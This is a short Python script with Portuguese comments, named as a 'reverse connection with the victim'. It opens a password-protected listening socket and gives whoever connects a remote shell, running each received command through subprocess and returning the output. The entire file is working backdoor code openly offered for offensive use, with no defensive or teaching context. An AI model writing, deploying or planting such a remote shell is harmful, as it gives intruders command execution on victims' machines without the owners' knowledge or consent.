#!/usr/bin/env python
# reverse_con.py
# Versao: 1.0
# Script para: Conexão reversa com a vitima
# Autor: Rodrigo Santos
import socket
import sys
import subprocess

ip = '127.0.0.1'  #Ip do servidor
port = 2121	  #porta do servidor

password = input('Defina a senha para conexao: ')
print('Ouvindo em %d' % (port))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip,port))
s.listen(5)
conn,addr = s.accept()	

# processo de autenticaçao 
conn.send('Por favor, autentique-se.\n'.encode("utf-8"))
tries = 3
typed = ''  # Preenchimento do usuario
while tries > 0:
  msg = '%sª Tentativa para digitar a senha: ' %str(tries)
  conn.send(msg.encode("utf-8"))
  typed = str(conn.recv(1024).decode())[:-1]
  print('Usuario digitou %s' % (typed))
  if typed != password:
    conn.send('Senha incorreta!\n'.encode("utf-8"))
  else:
    break;
  tries -= 1
if typed != password:
  conn.send("Excedido o numero de tentativas! Finalizando conexao...\n\n".encode("utf-8"))
  conn.close()
  s.close()
  sys.exit()

# Logado ao servidor
conn.send('\nBem vindo a conexao reversa. Eis seu shell...\nPS: Digite "sair" para sair'.encode("utf-8"))
print('Conexao de %s:%d' %(addr[0],addr[1]))
while True:
  conn.send('\nCMD > '.encode("utf-8"))
  cmd = str(conn.recv(1024).decode())[:-1]
  print('Comando executado: %s' % (cmd))
  _cmd = cmd.split()
  if _cmd[0] == 'sair':
    conn.close()
    break
  try:
    conn.send(str(subprocess.check_output(_cmd)).encode("utf-8"))
  except:
    conn.send('ERRO: Comando invalido'.encode("utf-8"))

s.close()
    
